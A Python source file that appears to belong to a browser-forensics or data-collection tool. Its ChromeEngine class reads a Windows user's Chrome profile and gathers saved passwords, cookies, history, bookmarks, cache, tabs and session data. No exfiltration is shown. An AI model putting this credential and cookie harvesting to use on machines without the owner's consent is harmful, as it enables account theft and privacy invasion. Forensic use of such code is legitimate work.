import Chromagnon_SNSS.chromagnonCache as cache
import Chromagnon_SNSS.chromagnonTab as lt
import Chromagnon_SNSS.chromagnonSession as ses
import chrome_bookmarks
import chrome_coockie
import chrome_password
import chrome_history
import threading
import os
import usefull_things as ut
import erros as err
import datetime

class ChromeEngine:
    def __init__(self):
        self.name = "chrome"
        chrome_path = os.path.expanduser('~') + "\AppData\Local\Google\Chrome\User Data\Default"
        if not ut.file_exists(chrome_path):
            self.is_valid = False
        else:
            self.is_valid = True
        if self.is_valid:
            self.info_bank = {}

    def get_chrome_saved_password(self):
        info = chrome_password.get_chrome_saved_password()
        if info[0] == 'err':
            err.error_handle([info[1:]], self.name)
        else:
            self.info_bank['passwords'] = info
            return info

    def get_chrome_history(self):
        info = chrome_history.get_chrome_history()
        if info[0] == 'err':
            err.error_handle([info[1:]], self.name)
        else:
            self.info_bank['history'] = info
            return info[0]

    def get_chrome_bookmarks(self):
        info = chrome_bookmarks.get_bookmarks()
        if info[0] == 'err':
            err.error_handle([info[1:]], self.name)
        else:
            self.info_bank['bookmarks'] = info

    def get_cookies(self):
        info = chrome_coockie.get_all_cookies()
        if info[0] == 'err':
            err.error_handle([info[1:]], self.name)
        else:
            self.info_bank['cookies'] = info
            return info[0]

    def get_all_cache_files(self):
        info = cache.get_all_cache()
        if info != None:
            f = open('/logs/chrome_erros.txt', 'a')
            f.write("-----------------\r\n" + str(datetime.datetime.now()) + "\r\n" + err.errs[info[1]] + " - " + info[2])
            f.close()

    def get_last_tabs(self):
        return lt.get_last_tabs()

    def get_session_info(self):
        return ses.get_last_session_info()